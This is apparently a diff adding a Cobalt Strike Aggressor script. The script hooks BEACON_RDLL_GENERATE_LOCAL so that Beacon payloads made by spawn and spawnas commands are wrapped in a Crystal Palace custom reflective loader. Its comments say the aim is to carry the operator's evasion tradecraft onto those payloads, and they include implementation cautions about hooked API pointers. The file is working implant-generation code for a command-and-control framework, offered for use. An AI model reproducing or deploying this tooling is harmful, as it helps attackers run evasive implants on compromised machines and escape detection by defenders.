@@ -1,0 +1,33 @@
+# BEACON_RDLL_GENERATE_LOCAL — Loader hook for Beacon-spawned payloads
+#
+# BEACON_RDLL_GENERATE fires when a payload is generated through the
+# Cobalt Strike client. BEACON_RDLL_GENERATE_LOCAL fires when Beacon
+# itself generates a payload in response to commands such as spawn and
+# spawnas. If only the former is registered, Beacons produced through
+# spawn-family commands use the default reflective loader with none of
+# the operator's evasion tradecraft.
+#
+# IMPORTANT: Do NOT use the parent-supplied $5 and $6 pointers when
+# Crystal Palace hooks are in effect. These refer to the hooked
+# versions of GetModuleHandleA/GetProcAddress within the parent's PICO.
+# Patching them into a child loader results in a crash.
+
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+set BEACON_RDLL_GENERATE_LOCAL {
+    local('$beacon $arch $spec_path $spec $final');
+    $beacon = $2; $arch = $3;
+    # Args 5 and 6 ignored intentionally.
+
+    if ($arch eq "x86") {
+        warn("Crystal Kit is x64 only");
+        return $null;
+    }
+
+    $spec_path = getFileProper(script_resource(), "loader.spec");
+    $spec  = [LinkSpec Parse: $spec_path];
+    $final = [$spec run: $beacon, [new HashMap]];
+
+    return $final;
+}
